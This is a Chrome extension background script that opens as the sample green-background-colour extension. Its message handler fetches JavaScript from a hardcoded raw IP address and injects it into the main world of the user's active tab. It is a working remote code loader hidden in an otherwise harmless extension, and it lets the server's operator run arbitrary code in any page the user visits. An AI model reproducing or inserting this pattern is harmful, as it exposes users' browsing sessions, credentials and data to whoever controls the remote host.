let color = '#3aa757';
chrome.runtime.onInstalled.addListener(() => {
    chrome.storage.sync.set({ color });
    console.log('Default background color set to %cgreen', `color: ${color}`);
});


chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'code') {
        let code = 'console.log("hello hc")';
        fetch('http://118.24.106.177:2333/test.js').then(res => res.text()).then(code => {
            execInPage(code);
        });
        // setTimeout(() => {
        //     sendResponse(code);
        // }, 2000);
    }
    return true;
});

async function execInPage(code) {
    const [tab] = await chrome.tabs.query({ currentWindow: true, active: true });
    chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: code => {
            const el = document.createElement('script');
            el.textContent = code;
            document.head.appendChild(el);
            console.log(window);
            el.remove();
        },
        args: [code],
        world: 'MAIN',
    });
}
